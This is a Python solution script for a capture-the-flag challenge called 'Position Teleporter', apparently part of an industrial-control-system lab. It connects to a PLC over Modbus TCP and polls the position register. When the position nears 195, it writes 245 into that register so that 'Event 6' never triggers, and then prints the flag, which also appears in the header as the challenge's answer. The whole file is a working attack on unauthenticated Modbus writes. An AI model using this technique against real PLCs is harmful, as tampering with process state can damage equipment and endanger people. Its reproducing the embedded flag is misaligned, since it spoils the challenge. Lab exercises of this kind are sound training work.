#!/usr/bin/env python3
"""
CTF Challenge 8: Position Teleporter
Difficulty: Hard
Points: 350
Flag: FLAG{T3L3P0RT4T10N_1S_R34L}

Objective: Skip Event 6 by teleporting position from 195 to 245
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_08_position_teleport.py <PLC_IP> [PORT]")
        sys.exit(1)

    plc_ip, plc_port = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 502
    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Connection failed")
        sys.exit(1)

    print("[*] CTF Challenge 8: Position Teleporter")
    print("[*] Waiting for position ~195...")

    while True:
        pos = client.read_holding_registers(1, 1)  # current_position
        if pos.isError():
            continue

        position = pos.registers[0]
        print(f"\r[*] Position: {position:3d}", end="", flush=True)

        # When near Event 6 zone (201-240)
        if 190 <= position <= 200:
            print(f"\n[*] At position {position}, preparing to teleport!")
            
            # Read Event 6 counter before
            evt6_before = client.read_holding_registers(1048, 1).registers[0]  # event_6_counter
            print(f"[*] Event 6 counter before: {evt6_before}")

            # TELEPORT: Jump past Event 6 zone
            print("[*] TELEPORTING to position 245...")
            client.write_register(1, 245)
            time.sleep(0.5)

            # Verify
            new_pos = client.read_holding_registers(1, 1).registers[0]
            evt6_after = client.read_holding_registers(1048, 1).registers[0]

            print(f"[+] New position: {new_pos}")
            print(f"[*] Event 6 counter after: {evt6_after}")
            print(f"[*] Jump distance: {new_pos - position}")

            if evt6_after == evt6_before:
                print("\n[+] Event 6 skipped successfully!")
                print("[+] Teleportation complete!")
                print("[+] Flag: FLAG{T3L3P0RT4T10N_1S_R34L}")
            else:
                print("\n[!] Event 6 was triggered")

            break

        time.sleep(0.1)

    client.close()

if __name__ == "__main__":
    main()
